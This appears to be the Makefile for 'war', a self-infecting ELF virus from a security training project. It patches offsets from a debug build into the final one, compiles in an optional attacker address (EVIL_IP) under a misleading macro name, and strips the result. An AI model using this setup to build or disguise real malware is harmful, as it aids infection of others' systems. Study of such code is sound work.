include source.mk

NAME	 =	war
NAME_CLEAN =	war_clean

VIRGIN = $(ODIR)/$(NAME).virgin

ODIR	 =	objs/
IDIR	 =	incs/
SDIR	 =	srcs/

OBJS	 =	$(addsuffix .o, $(addprefix $(ODIR), $(SRCS)))

CFLAGS   =	-I$(IDIR)
CFLAGS	 +=	-Werror
CFLAGS	 +=	-nostdlib -fno-builtin
CFLAGS	 += -O0 -finline-functions
CFLAGS 	 += -fomit-frame-pointer
CFLAGS	 += -fno-asynchronous-unwind-tables
CFLAGS	 += -fno-merge-all-constants
CFLAGS	 += -fno-optimize-sibling-calls
CFLAGS	 += -fno-jump-tables
CFLAGS	 += -fno-pic
CFLAGS	 += -nodefaultlibs
CFLAGS	 += -fno-stack-protector
CFLAGS	 += -fno-asynchronous-unwind-tables
CFLAGS	 += -fno-unwind-tables
CFLAGS	 += -fno-semantic-interposition
CFLAGS	 += -fvisibility=hidden
NFLAGS	  =	-f elf64

CLN_COLOR	=	"\e[38;5;221m"
FCLN_COLOR	=	"\e[38;5;215m"
OBJ_COLOR	=	"\e[38;5;203m"
BIN_COLOR	=	$(OBJ_COLOR)
ERASE_LINE	=	"\e[2K\r"

CC		 =	clang
RM		 =	@rm -rf
MKDIR	 =	@mkdir -p
NASM	 =	@nasm

all: $(NAME)

comma := ,
_IP_VALID := $(shell echo "$(EVIL_IP)" | awk -F. '\
  NF==4 &&\
  $$1>=0 && $$1<=255 &&\
  $$2>=0 && $$2<=255 &&\
  $$3>=0 && $$3<=255 &&\
  $$4>=0 && $$4<=255 {print "ok"}')
ifeq ($(EVIL_IP),)
EVIL_IP :=
else
$(if $(_IP_VALID),,$(error EVIL_IP="$(EVIL_IP)" is not a valid IP address))
EVIL_IP := RUNTIME_PATCH_SIZE($(subst .,$(comma) ,$(EVIL_IP)))
EVIL_IP := -DVIRTUAL_MAP_STRIDE="$(EVIL_IP)"
endif

clean:
	$(RM) $(ODIR)
	@printf $(CLN_COLOR)"\tClean \t\t\t\t[ ✓ ]\n\e[m"

fclean: clean
	$(RM) $(NAME)
	@printf $(FCLN_COLOR)"\tBinary clean \t\t\t[ ✓ ]\n\e[m"

re: fclean all

$(ODIR)%.o.virgin:  $(SDIR)%.c
	$(MKDIR) $(dir $@)
	@$(CC) $(CFLAGS) -c $< -o $@
	@printf $(ERASE_LINE)$(OBJ_COLOR)"\t"$@"\e[m"

$(ODIR)%.o:  $(SDIR)%.c $(VIRGIN)
	$(MKDIR) $(dir $@)
	@FRENZY="0x$$(readelf -S  $(VIRGIN) | grep .text | awk '{print $$5}')"; \
	VARAX="0x$$(readelf -S  $(VIRGIN) | grep -A1 .text | tail -n1 | awk '{print $$1}')"; \
	CYANURE="0x$$(readelf -s  $(VIRGIN) | grep cyanure | awk '{print $$2}')"; \
	BUBONIK="0x$$(readelf -s  $(VIRGIN) | grep "\b_start\b" | awk '{print $$2}')"; \
	ECHIDNAE="0x$$(readelf -s  $(VIRGIN) | grep "\bstr4\b" | awk '{print $$2}')"; \
	ANCHOR="0x$$(readelf -s  $(VIRGIN) | grep "\banchor\b" | awk '{print $$2}')"; \
	$(CC) $(CFLAGS) \
		-DFRENZY="$$FRENZY" \
		-DVARAX="$$VARAX"\
		-DCYANURE="$$CYANURE" \
		-DECHIDNAE="$$ECHIDNAE" \
		-DBUBONIK="$$BUBONIK" \
		-DANCHOR="$$ANCHOR" \
		$(EVIL_IP) \
		-c $< -o $@
	@printf $(ERASE_LINE)$(OBJ_COLOR)"\t"$@"\e[m"

$(VIRGIN): $(addsuffix .virgin, $(OBJS))
	@$(CC) $(CFLAGS) -g -no-pie $^ -o $@

$(NAME): $(OBJS)
	@$(CC) $(CFLAGS) -no-pie $^ -o $@
	@strip --strip-all $@
	@objcopy \
	  --remove-section .comment \
	  --remove-section .note \
	 $@
	@printf $(ERASE_LINE)$(BIN_COLOR)"\t"$@"\t\t\t\t[ ✓ ]\n\e[m"

print_curare: curare
	@hexdump -e '16/1 "%02x " "\n"' curare | xargs | sed 's/ /, /g' | sed 's/^/ /g' | sed 's/ / 0x/g'

curare: test/curare.s
	@nasm test/curare.s -o curare

.PHONY: all clean fclean re print_curare
